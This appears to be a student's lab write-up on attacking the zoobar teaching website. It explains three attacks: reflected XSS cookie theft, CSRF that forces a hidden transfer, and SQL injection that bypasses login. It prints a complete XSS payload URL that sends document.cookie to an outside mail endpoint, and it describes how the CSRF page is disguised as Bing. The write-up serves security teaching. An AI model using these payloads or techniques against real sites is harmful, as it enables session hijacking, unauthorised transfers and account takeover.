# Attack A: Cookie Theft

The main vulnerability of this part is that the script of the zoobar website directly adds and processes the submitted URL query as HTML code. That means hackers can insert malicious javascript code into the URL query for execution and steal user information and cookies.

In my solution, I created a URL that leverages this vulnerability to steal the cookie of the logged user. I first add ">" at the end of "http://zoobar.org/users.php?user=" to end the previous tag, and then I add "<script>" to start a javascript tag block, in which I created a new Image object and set its "src" attribute as a link to http://zoomail.org/sendmail.php. This link will help me send an email with stolen content to my mailbox. In the link, I set netid as jrao7 (my netid), payload as document.cookie (stealing cookie!), and random as Math.random(). In order to avoid potential warning text or changes that the user may notice, I then redirect the website to http://zoobar.org/users.php. Finally "</script>" is added to end the javascript tag.

The created URL looks like follows:
http://zoobar.org/users.php?user="><script>new Image().src='http://zoomail.org/sendmail.php?netid=jrao7&payload='+document.cookie+'&random='+Math.random();document.location='http://zoobar.org/users.php';</script>

Finally, after URL encoding, it looks like follows:
http://zoobar.org/users.php?user=%22%3E%3Cscript%3Enew+Image%28%29.src%3D%27http%3A%2F%2Fzoomail.org%2Fsendmail.php%3Fnetid%3Djrao7%26payload%3D%27%2Bdocument.cookie%2B%27%26random%3D%27%2BMath.random%28%29%3Bdocument.location%3D%27http%3A%2F%2Fzoobar.org%2Fusers.php%27%3B%3C%2Fscript%3E

Usage:

1. First log in any account
2. Execute the URL in the address bar

# Attack B: Cross-Site Request Forgery

The main vulnerability of this part is that hackers can make malicious HTML pages and use the cookie stored in Browser to impersonate the logged user to make CSRF attacks (e.g., pretend to be the actual user to make a credit transfer).

In my solution, I created an HTML page and put two elements: One is an invisible iframe, the other one is a POST form. The invisible iframe is used to load the webpage secretly. The form contains three hidden input elements: two inputs for setting transfer amount (10) and destination account ("attacker") respectively, and one input that serves as a submission button. The form targets to the iframe, and its action is set as http://zoobar.org/transfer.php in order to do the transfer.

For the javascript, I defined an onclick function for the submission button to do the redirection. That is, when the submission button is clicked and the submission is finished, the page will be redirected to www.bing.com seamlessly. In the script, the button will be automatically clicked when the HTML page is opened. I also set the title of the HTML page as "Bing" in case the user notices the difference.

Usage:

1. First log in any account (except for "attacker")
2. Use Iceweasel browser to open b.html

# Attack C: SQL Injection

The main vulnerability of this part is that the validation of username is actually not guaranteed and this the SQL can be injected. For example, "--" in SQL represents commenting. When "--" appears in a SQL sentence, all the content after that will be commented and ignored. According to auth.php, a username with "--" in it will be regarded as a valid username (actually, the username will be quoted using escapeString method, but technically, username with "--" can still be stored in the database. That is why I said it can be regarded as a valid username), and the system forms the SQL query string by directly connecting the submitted username and password. That means, all the remaining SQL conditions, including password checking, will be commented by username with "--" at the end, and this SQL will successfully retrieve the database without a password. Thus, if we can add "--" to the end of some registered usernames, and store these "corrupted" usernames into the database, then we are able to log in these users without password check.

More specifically, we should add "';--" to the end of a registered username (e.g., jrao7), and register it ("jrao7';--") into the database. When we login, we can use "jrao7';--" as the username, and input any password we want, then the "corrupted" username "jrao7';--" will pass the username validation (because "jrao7';--" exists in the database) and comment password check in SQL sentence. Finally, we will log in "jrao7" without the correct password.

In my solution, I made an HTML page that is similar with the page of Attack B task. I created a POST form with action as http://zoobar.org/index.php in order to register or login. In this form, I created three input. One is for username input, one is for password (hidden, with a default password for submission. You don't need to input password manually), and one that serves as the register button.

For the javascript, I defined an onclick function for the register button to do the registration. That is, when the register button is clicked, "';--" will first be added to the input username as a new tail, and then the form will be submitted as a registration request, and this modified username will be registered into the database as a new user. After successful registration, you will log into the website automatically. Since the username we just registered is a previously registered username with "';--", then the system actually will allow you to log in that previously registered username without password check.

Usage:

1. Use Iceweasel browser to open c.html
2. Input the username you want to login, and click on Log in button.